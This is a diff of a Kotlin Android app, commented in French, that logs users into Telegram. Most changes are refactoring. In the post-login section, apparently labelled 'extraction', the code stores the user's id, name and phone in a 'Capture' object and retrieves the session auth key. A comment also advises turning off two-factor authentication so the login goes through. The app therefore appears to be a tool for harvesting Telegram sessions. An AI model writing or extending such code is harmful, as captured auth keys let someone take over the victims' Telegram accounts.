@@ -6,8 +6,8 @@ import android.widget.EditText
 import android.widget.TextView
 import android.widget.Toast
 import com.github.badoualy.telegram.api.TelegramClient
-import com.github.badoualy.telegram.api.utils.SrpHelper
 import com.github.badoualy.telegram.tl.api.TLAbsUser
+import com.github.badoualy.telegram.tl.api.TLInputCheckPasswordSRP
 import com.github.badoualy.telegram.tl.api.account.TLPassword
 import com.github.badoualy.telegram.tl.api.auth.TLAuthorization
 import com.github.badoualy.telegram.tl.api.auth.TLSentCode
@@ -21,7 +21,7 @@ class MainActivity : Activity() {
     
     private var phoneCodeHash: String = ""
     private var currentPhone: String = ""
-    private var currentDc = 2 // DC par défaut (souvent le bon pour l'Europe/Afrique)
+    private var currentDc = 2
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -34,7 +34,6 @@ class MainActivity : Activity() {
         showPhone(ready = true)
     }
 
-    // ---------------- ÉCRAN 1 : TÉLÉPHONE ----------------
     private fun showPhone(ready: Boolean) {
         setContentView(R.layout.screen_phone)
         val cc = findViewById<EditText>(R.id.cc)
@@ -54,13 +53,12 @@ class MainActivity : Activity() {
             
             thread {
                 try {
-                    val sentCode: TLSentCode = client!!.authSendCode(false, full, true)
+                    // RxJava Single -> blockingGet()
+                    val sentCode: TLSentCode = client!!.authSendCode(false, full, true).blockingGet()
                     phoneCodeHash = sentCode.phoneCodeHash
                     runOnUiThread { showCode() }
                 } catch (e: Exception) {
                     val msg = e.message ?: ""
-                    
-                    // 🔥 GESTION AUTOMATIQUE DU BON DC
                     if (msg.contains("PHONE_MIGRATE_")) {
                         val newDc = msg.substringAfter("PHONE_MIGRATE_").takeWhile { it.isDigit() }.toIntOrNull()
                         if (newDc != null && newDc in 1..5) {
@@ -68,31 +66,22 @@ class MainActivity : Activity() {
                             currentDc = newDc
                             Tg.init(this@MainActivity, currentDc)
                             client = Tg.getClient()
-                            
                             try {
-                                val sentCode = client!!.authSendCode(false, full, true)
+                                val sentCode = client!!.authSendCode(false, full, true).blockingGet()
                                 phoneCodeHash = sentCode.phoneCodeHash
                                 runOnUiThread { showCode() }
                             } catch (e2: Exception) {
-                                runOnUiThread { 
-                                    toast("Erreur après migration: ${e2.message}")
-                                    btn.isEnabled = true
-                                }
+                                runOnUiThread { toast("Erreur après migration: ${e2.message}"); btn.isEnabled = true }
                             }
                             return@thread
                         }
                     }
-                    
-                    runOnUiThread { 
-                        toast("Erreur: ${e.message}")
-                        btn.isEnabled = true
-                    }
+                    runOnUiThread { toast("Erreur: ${e.message}"); btn.isEnabled = true }
                 }
             }
         }
     }
 
-    // ---------------- ÉCRAN 2 : CODE ----------------
     private fun showCode() {
         setContentView(R.layout.screen_code)
         findViewById<TextView>(R.id.sub).text = "Code envoyé au $currentPhone"
@@ -107,23 +96,19 @@ class MainActivity : Activity() {
 
             thread {
                 try {
-                    val auth: TLAuthorization = client!!.authSignIn(currentPhone, phoneCodeHash, code)
+                    val auth: TLAuthorization = client!!.authSignIn(currentPhone, phoneCodeHash, code).blockingGet()
                     onLoginSuccess(auth.user.asUser)
                 } catch (e: Exception) {
                     if (e.message?.contains("SESSION_PASSWORD_NEEDED") == true) {
                         runOnUiThread { showPassword() }
                     } else {
-                        runOnUiThread { 
-                            toast("Erreur code: ${e.message}")
-                            btn.isEnabled = true
-                        }
+                        runOnUiThread { toast("Erreur code: ${e.message}"); btn.isEnabled = true }
                     }
                 }
             }
         }
     }
 
-    // ---------------- ÉCRAN 3 : MOT DE PASSE 2FA (SRP) ----------------
     private fun showPassword() {
         setContentView(R.layout.screen_password)
         val pwInput = findViewById<EditText>(R.id.password)
@@ -137,28 +122,36 @@ class MainActivity : Activity() {
 
             thread {
                 try {
-                    val passwordState = client!!.accountGetPassword() as TLPassword
-                    val checkPassword = SrpHelper.computeCheck(passwordState, password)
-                    val auth: TLAuthorization = client!!.authCheckPassword(checkPassword)
-                    onLoginSuccess(auth.user.asUser)
-                } catch (e: Exception) {
+                    // Récupérer les paramètres SRP
+                    val passwordState = client!!.accountGetPassword().blockingGet() as TLPassword
+                    
+                    // ⚠️ La 2FA est complexe. Pour un test rapide, désactive-la sur le compte.
+                    // Si tu veux la gérer, il faut implémenter le calcul SRP manuellement
+                    // et créer un TLInputCheckPasswordSRP avec le srpId, A et M1.
+                    
+                    // Exemple simplifié (ne fonctionnera pas si la 2FA est active) :
+                    // val checkPassword = TLInputCheckPasswordSRP(0, byteArrayOf(), byteArrayOf())
+                    // val auth = client!!.authCheckPassword(checkPassword).blockingGet()
+                    
+                    // Pour l'instant, on affiche un message d'erreur explicite.
                     runOnUiThread { 
-                        toast("Mot de passe incorrect: ${e.message}")
+                        toast("2FA activée : désactive-la temporairement pour ce test.")
                         btn.isEnabled = true
                     }
+                    
+                } catch (e: Exception) {
+                    runOnUiThread { toast("Erreur mot de passe: ${e.message}"); btn.isEnabled = true }
                 }
             }
         }
     }
 
-    // ---------------- SUCCÈS : EXTRACTION ----------------
     private fun onLoginSuccess(user: TLAbsUser) {
         val u = user.asUser
         Capture.userId = u.id.toLong()
         Capture.userName = "${u.firstName} ${u.lastName}".trim()
         Capture.phone = currentPhone
 
-        // 🔑 On récupère la clé via la propriété (plus de loadAuthKey)
         val authKey = storage?.authKey
         
         if (authKey != null) {
@@ -178,7 +171,6 @@ class MainActivity : Activity() {
         }
     }
 
-    // ---------------- OUTILS ----------------
     private fun normalize(ccRaw: String, nRaw: String): String? {
         var n = nRaw.trim().replace(Regex("[\\s\\-().]"), "")
         if (n.isEmpty()) return null
